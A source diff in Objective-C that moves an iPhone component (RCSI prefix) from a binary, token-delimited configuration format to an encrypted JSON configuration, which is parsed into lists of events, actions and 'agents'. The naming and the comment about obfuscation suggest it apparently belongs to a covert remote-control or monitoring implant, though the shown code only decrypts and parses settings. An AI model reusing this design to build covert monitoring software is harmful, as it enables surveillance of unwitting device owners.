@@ -18,7 +18,13 @@
 #import "RCSICommon.h"
 #import "RCSIUtils.h"
 
-//#define DEBUG_VERBOSE_1
+#define JSON_CONFIG
+
+#ifdef JSON_CONFIG
+#import "RCSIJSonConfiguration.h"
+#endif
+
+//#define DEBUG_
 
 #pragma mark -
 #pragma mark Configurator Struct Definition
@@ -394,218 +400,61 @@ typedef struct _eventConf {
 
 - (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile
 {
-  BOOL rVal = NO;
-  int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
-  int endOfConfData;
-  NSData *configuration;
-  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  configuration = [mEncryption decryptConfiguration: configurationFile];
-  
-  if (configuration == nil) 
-  {
-    [pool release];
-    return NO;
-  }
-  
-  [configuration getBytes: &endOfConfData
-                    range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
-  
-  // Exclude sizeof(Final CRC) + sizeof(LEN field)
-  endOfConfData = endOfConfData - sizeof(int) * 2;
-  
-  NSData *configurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
-                                                                    endOfConfData)];
-  
-  u_long pos = 0;
-  
-  if ([self _searchDataForToken: configurationData
-                          token: ENDOF_CONF_DELIMITER
-                       position: &pos] == YES)
-    rVal = YES;
-  else 
-    rVal = NO;
 
+  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
+
+  if (configuration == nil) 
+    {
+      [pool release];
+      return NO;
+    }
+  else // FIXED-
+    [configuration release];
+  
   [pool release];
   
-  return rVal;
+  return YES;
 }
 
 - (BOOL)loadConfiguration
 {
-  NSString *configurationFile;
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEV_MODE      
-  //configurationFile = @"/private/var/mobile/RCSIphone/conf_iphone.bin";
-  configurationFile = gConfigurationName;
-#else    
-  configurationFile = gConfigurationName;
-#endif
+  //NSString *configurationFile = gConfigurationName;
+  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
+ 
+  // XXX- check path name 
+  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
+                                                                 [[NSBundle mainBundle] bundlePath],
+                                                                 gConfigurationName];
+                                 
+  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
   
-#ifdef DEBUG
-   NSLog(@"loadConfiguration: configurationFile %@", configurationFile);
-#endif
-  
-  int numberOfOccurrences;
-  
-  //
-  // Decrypt the configuration file data
-  //
-  NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
-  
-  if (configuration != nil)
+  [configurationFile release];
+      
+  if (configuration == nil)
     {
-      RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-      
-      //
-      // For safety we remove all the previous objects
-      //
-      [taskManager removeAllElements];
-#ifdef DEBUG_VERBOSE_1
-      [configuration writeToFile: @"/tmp/conf_decrypted.bin"
-                      atomically: YES];
-#endif
-      
-      int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
-      int endOfConfData;
-      
-      [configuration getBytes: &endOfConfData
-                        range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
-      
-      // Exclude sizeof(Final CRC) + sizeof(LEN field)
-      endOfConfData = endOfConfData - sizeof(int) * 2;
-      
-      mConfigurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
-                                                                        endOfConfData)];
-      
-      u_long pos = 0;
-      int offsetActions = 0;
-      
-      if ([self _searchDataForToken: mConfigurationData
-                              token: EVENT_CONF_DELIMITER
-                           position: &pos] == YES)
-        {
-          // Skip the EVENT Token + \00
-          pos += strlen(EVENT_CONF_DELIMITER) + 1;
-          
-          //
-          // Read num of events
-          //
-          [mConfigurationData getBytes: &numberOfOccurrences
-                                 range: NSMakeRange(pos, sizeof(int))];
-#ifdef DEBUG
-          NSLog(@"Parsing (%d) Events at offset (%x)", numberOfOccurrences, pos);
-#endif
-          // Skip numberOfEvents (DWORD)
-          pos += sizeof(int);
-          NSData *tempData = [mConfigurationData subdataWithRange:
-                              NSMakeRange(pos, endOfConfData - pos)];
-          
-          //
-          // Parse events - returns the fileoffset for actions
-          // since there's no token
-          //
-          offsetActions = [self _parseEvents: tempData
-                                      nTimes: numberOfOccurrences];
-        }
-      else
-        {
-          // TODO: Handle the error from searchDataForToken
-#ifdef DEBUG
-          NSLog(@"event - searchDataForToken sux");
-#endif
-          return NO;
-        }
-      
-#ifdef DEBUG_VERBOSE_1
-      NSLog(@"Offset: %x", offsetActions);
-#endif
-      // Read num of actions
-      [mConfigurationData getBytes: &numberOfOccurrences
-                             range: NSMakeRange(offsetActions, sizeof(int))];
-#ifdef DEBUG
-      NSLog(@"Parsing (%d) Actions at offset (%x)", numberOfOccurrences, offsetActions);
-#endif
-      // Skip numberOfActions (DWORD)
-      offsetActions += sizeof(int);
-      
-      NSData *tempData = [mConfigurationData subdataWithRange:
-                          NSMakeRange(offsetActions,
-                                      endOfConfData - offsetActions)];
-
-      //NSLog(@"actions %@", tempData);
-
-      //
-      // Parse actions here since our wonderful/functional/flexible/extendible
-      // configuration file doesn't have an action header, obfuscation FTW
-      //
-      [self _parseActions: tempData
-                   nTimes: numberOfOccurrences];
-      
-      if ([self _searchDataForToken: mConfigurationData
-                              token: AGENT_CONF_DELIMITER
-                           position: &pos] == YES)
-        {
-          // Skip the EVENT Token + \00
-          pos += strlen(AGENT_CONF_DELIMITER) + 1;
-          
-          //
-          // Read num of agents
-          //
-          [mConfigurationData getBytes: &numberOfOccurrences
-                                 range: NSMakeRange(pos, sizeof(int))];
-#ifdef DEBUG
-          NSLog(@"Parsing (%d) Agents at offset (%x)", numberOfOccurrences, pos);
-#endif
-          // Skip numberOfAgents (DWORD)
-          pos += sizeof(int);
-          NSData *tempData = [mConfigurationData subdataWithRange:
-                              NSMakeRange(pos,
-                                          endOfConfData - pos)];
-          
-          //
-          // Parse agents
-          //
-          [self _parseAgents: tempData nTimes: numberOfOccurrences];
-        }
-      else
-        {
-          // TODO: Handle the error from searchDataForToken
-#ifdef DEBUG
-          NSLog(@"agents - searchDataForToken sux");
-#endif
-          return NO;
-        }
-      
-      if ([self _searchDataForToken: mConfigurationData
-                              token: MOBILE_CONF_DELIMITER
-                           position: &pos] == YES)
-        {
-          // Skip the MOBILE Token + \00
-          pos += strlen(MOBILE_CONF_DELIMITER) + 1;
-          
-          // TODO
-        }
-      else
-        {
-#ifdef DEBUG
-          NSLog(@"mobile conf - searchDataForToken sux");
-#endif
-          return NO;
-        }
-          
-    }
-  else
-    {
-#ifdef DEBUG
-      NSLog(@"Error while decrypting configuration");
-#endif
-      
+      [pool release];
       return NO;
     }
+    
+  // For safety we remove all the previous objects
+  [taskManager removeAllElements];
+
+  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
   
-  return YES;
+  // Running the parser and populate the lists
+  BOOL bRet = [jSonDel runParser: configuration 
+                      WithEvents: [taskManager mEventsList] 
+                      andActions: [taskManager mActionsList] 
+                      andModules: [taskManager mAgentsList]];
+  
+  [jSonDel release];
+  [configuration release];
+  [pool release];
+  
+  return bRet;
 }
 
 - (RCSIEncryption *)encryption
